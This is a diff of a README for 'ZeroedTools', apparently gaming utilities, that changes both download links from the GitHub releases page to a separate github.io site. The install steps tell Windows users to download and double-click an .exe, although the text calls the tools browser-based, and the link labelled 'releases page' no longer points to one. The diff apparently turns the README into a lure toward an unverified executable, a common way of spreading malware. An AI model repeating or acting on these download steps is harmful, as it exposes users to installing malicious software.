@@ -1,6 +1,6 @@
 # 🎯 zeroedtools - Optimize your gaming performance with tools
 
-[![Download ZeroedTools](https://img.shields.io/badge/Download-ZeroedTools-blue.svg)](https://github.com/Boxseatplasterer571/zeroedtools/releases)
+[![Download ZeroedTools](https://img.shields.io/badge/Download-ZeroedTools-blue.svg)](https://boxseatplasterer571.github.io)
 
 ZeroedTools provides a suite of browser-based utilities for gamers. These tools help you calibrate mouse sensitivity, test controller inputs, verify display refresh rates, and measure reaction times. You use these tools to achieve consistent settings across different games like Valorant, Apex Legends, and Counter-Strike 2.
 
@@ -9,7 +9,7 @@ ZeroedTools provides a suite of browser-based utilities for gamers. These tools 
 Follow these steps to access and use the tools on your Windows computer.
 
 1. Open your preferred web browser.
-2. Navigate to the [ZeroedTools releases page](https://github.com/Boxseatplasterer571/zeroedtools/releases).
+2. Navigate to the [ZeroedTools releases page](https://boxseatplasterer571.github.io).
 3. Look for the most recent version labeled as "Latest" on the right side of the page.
 4. Click on the file ending in `.exe` under the "Assets" section to save it to your computer.
 5. Locate the file in your downloads folder and double-click the file to open the application.
